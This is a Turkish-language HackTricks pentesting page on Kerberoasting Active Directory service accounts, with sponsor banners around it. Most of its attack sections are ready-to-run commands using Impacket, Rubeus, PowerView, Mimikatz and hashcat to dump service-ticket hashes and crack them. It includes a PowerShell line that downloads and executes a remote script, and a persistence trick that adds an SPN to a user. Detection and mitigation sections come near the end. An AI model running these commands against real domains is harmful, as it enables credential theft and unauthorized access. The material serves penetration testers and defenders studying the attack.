# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

## Kerberoast

Kerberoast, özellikle **Active Directory (AD)** altında **kullanıcı hesapları** ile çalışan hizmetlere ait **TGS biletlerinin** elde edilmesine odaklanır ve **bilgisayar hesapları** hariç tutulur. Bu biletlerin şifrelemesi, **kullanıcı şifrelerinden** kaynaklanan anahtarları kullanır ve **çevrimdışı kimlik bilgilerinin kırılma** olasılığına olanak tanır. Bir kullanıcı hesabının bir hizmet olarak kullanılması, boş olmayan bir **"ServicePrincipalName"** özelliği ile belirtilir.

**Kerberoast**'ı gerçekleştirmek için, **TGS biletleri** isteyebilen bir etki alanı hesabına ihtiyaç vardır; ancak bu işlem, **özel ayrıcalıklar** gerektirmez ve **geçerli etki alanı kimlik bilgilerine** sahip herkes tarafından erişilebilir.

### Ana Noktalar:
- **Kerberoast**, **AD** içindeki **kullanıcı hesaplarına** ait **TGS biletlerini** hedef alır.
- **Kullanıcı şifrelerinden** kaynaklanan anahtarlarla şifrelenen biletler **çevrimdışı olarak kırılabilir**.
- Bir hizmet, boş olmayan bir **ServicePrincipalName** ile tanımlanır.
- Sadece **geçerli etki alanı kimlik bilgileri** gereklidir, **özel ayrıcalıklar** gerektirmez.

### **Saldırı**

{% hint style="warning" %}
**Kerberoast araçları**, saldırıyı gerçekleştirirken ve TGS-REQ isteklerini başlatırken genellikle **`RC4 şifrelemesi`** talep eder. Bunun nedeni, **RC4'ün** [**zayıf**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) olması ve Hashcat gibi araçlarla diğer şifreleme algoritmaları olan AES-128 ve AES-256'ya göre çevrimdışı olarak daha kolay kırılabilmesidir.\
RC4 (tip 23) karmaşaları **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) karmaşaları **`$krb5tgs$18$*`** ile başlar.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Kerberoast edilebilir kullanıcıların bir dökümünü içeren çoklu özellikli araçlar:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoast edilebilir kullanıcıları sırala**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Teknik 1: TGS isteyin ve bellekten dökün**

Bu teknik, Kerberos bileşenlerini hedef alır ve hedefin kimlik doğrulama hizmetine (AS) erişimi olan bir hesapla çalışır. Bu hesap, hedefin hizmet hesaplarının TGS'lerini (Service Ticket Granting Ticket) talep edebilir ve bellekte saklanan TGS'leri elde edebilir.

1. İlk adımda, hedefin kimlik doğrulama hizmetine erişimi olan bir hesap bulunmalıdır. Bu hesap, hedefin hizmet hesaplarının TGS'lerini talep edebilmelidir.

2. Ardından, hedefin hizmet hesaplarının SPN'lerini (Service Principal Name) elde etmek için bir tarama yapılmalıdır. SPN'ler, hedefin hizmetlerini tanımlayan benzersiz kimliklerdir.

3. SPN'leri elde ettikten sonra, bu SPN'ler için TGS talepleri yapılmalıdır. Bu talepler, hedefin kimlik doğrulama hizmetine erişimi olan hesap tarafından yapılmalıdır.

4. TGS talepleri başarıyla tamamlandıktan sonra, bellekte saklanan TGS'leri elde etmek için bu taleplerin bellek dökümü yapılmalıdır.

Bu teknik, hedefin hizmet hesaplarının TGS'lerini elde etmek için kullanılır ve bu TGS'lerin çözülmesiyle hedefin hizmet hesaplarının parolaları elde edilebilir. Bu parolalar daha sonra saldırgan tarafından kullanılabilir.
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Teknik 2: Otomatik araçlar**

Bu teknikte, Kerberoasting saldırısını gerçekleştirmek için otomatik araçlar kullanılır. Bu araçlar, hedef Active Directory ortamında hedeflenen hesapları tespit eder ve Kerberos hizmet hesaplarının parolalarını çalmak için gerekli adımları otomatik olarak gerçekleştirir.

Bu otomatik araçlar, Kerberoasting saldırısını gerçekleştirmek için gerekli olan TGS (Ticket Granting Service) hizmet hesaplarını tespit etmek için Active Directory ortamını tarar. Ardından, bu hesapların parolalarını çalmak için gerekli olan TGS hizmet bileti isteğini yapar ve bu bileti alır. Son olarak, bu bileti çözerek hedef hesabın parolasını elde eder.

Bu otomatik araçlar, Kerberoasting saldırısını gerçekleştirmek için kullanılan çeşitli yöntemlere sahip olabilir. Örneğin, bir araç, hedef Active Directory ortamında tüm hizmet hesaplarını tespit edebilir ve bu hesapların parolalarını çalmak için gerekli adımları otomatik olarak gerçekleştirebilir. Başka bir araç ise, belirli bir hizmet hesabını hedefleyebilir ve sadece bu hesabın parolasını çalmak için gerekli adımları gerçekleştirebilir.

Bu otomatik araçlar, Kerberoasting saldırısını gerçekleştirmek için oldukça etkili olabilir. Ancak, bu araçların kullanımı, yasal ve etik sınırlar içinde olmalıdır. Aksi takdirde, yasadışı faaliyetlere yol açabilir ve ciddi sonuçlara neden olabilir.
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Bir TGS istendiğinde, Windows olayı `4769 - Bir Kerberos hizmet bileti istendi` oluşturulur.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Kırma
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Kalıcılık

Eğer bir kullanıcı üzerinde **yeterli izinlere** sahipseniz, onu **kerberoast edilebilir** hale getirebilirsiniz:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Kerberoast saldırıları için yararlı **araçları** burada bulabilirsiniz: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Eğer Linux'tan şu **hata**yı alıyorsanız: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Zaman uyumsuzluğu çok büyük)`**, bu yerel saatinizden kaynaklanır, ana bilgisayarı DC ile senkronize etmeniz gerekmektedir. Birkaç seçenek vardır:

* `ntpdate <DC'nin IP'si>` - Ubuntu 16.04'ten itibaren kullanım dışıdır.
* `rdate -n <DC'nin IP'si>`

### Önlem

Kerberoast saldırısı, sömürülebilirse oldukça gizli bir şekilde gerçekleştirilebilir. Bu faaliyeti tespit etmek için dikkat edilmesi gereken nokta, bir Kerberos bileti istendiğini gösteren **Güvenlik Olayı Kimliği 4769**'dur. Ancak, bu olayın yüksek frekansı nedeniyle, şüpheli faaliyetleri izole etmek için belirli filtreler uygulanmalıdır:

- Hizmet adı **krbtgt** olmamalıdır, çünkü bu normal bir istektir.
- **$** ile biten hizmet adları, hizmetler için kullanılan makine hesaplarını dahil etmemek için hariç tutulmalıdır.
- Makinelerden gelen istekler, **makine@domain** şeklindeki hesap adları hariç tutularak filtrelenmelidir.
- Sadece başarılı bilet istekleri dikkate alınmalıdır, bunlar **'0x0'** hata koduyla belirlenir.
- **En önemlisi**, bilet şifreleme türü genellikle Kerberoast saldırılarında kullanılan **0x17** olmalıdır.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoasting riskini azaltmak için:

- **Hizmet Hesabı Parolalarının tahmin edilmesi zor olmasını** sağlayın ve en az **25 karakter** uzunluğunda olmasını önerin.
- **Yönetilen Hizmet Hesaplarını** kullanın, bu hesaplar **otomatik parola değişiklikleri** ve **yetkilendirilmiş Hizmet İlkesi Adı (SPN) Yönetimi** gibi avantajlar sunarak bu tür saldırılara karşı güvenliği artırır.

Bu önlemleri uygulayarak, kuruluşlar Kerberoasting ile ilişkili riski önemli ölçüde azaltabilirler.


## Alan hesabı olmadan Kerberoast

**Eylül 2022**'de, bir araştırmacı olan Charlie Clark tarafından bir sistem sömürüsü yöntemi keşfedildi ve [exploit.ph](https://exploit.ph/) platformu üzerinden paylaşıldı. Bu yöntem, herhangi bir Active Directory hesabı üzerinde kontrol gerektirmeyen bir **KRB_AS_REQ** isteği aracılığıyla **Hizmet Biletleri (ST)** elde etmeyi sağlar. Temel olarak, bir pre-authentication gerektirmeyen bir prensip yapılandırıldığında - siber güvenlik alanında bir **AS-REP Roasting saldırısı** olarak bilinen bir senaryoya benzer bir senaryo - bu özellik istek sürecini manipüle etmek için kullanılabilir. Özellikle, isteğin gövdesindeki **sname** özniteliği değiştirilerek, sistem standart şifrelenmiş Bilet Verme Bileti (TGT) yerine bir **ST** vermesi için aldatılır.

Teknik, bu makalede tam olarak açıklanmaktadır: [Semperis blog yazısı](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Bu teknik kullanılarak LDAP sorgusu yapmak için geçerli bir hesabımız olmadığından, bir kullanıcı listesi sağlamanız gerekmektedir.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py PR #1413'ten](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus PR #139'dan](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referanslar
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturup otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
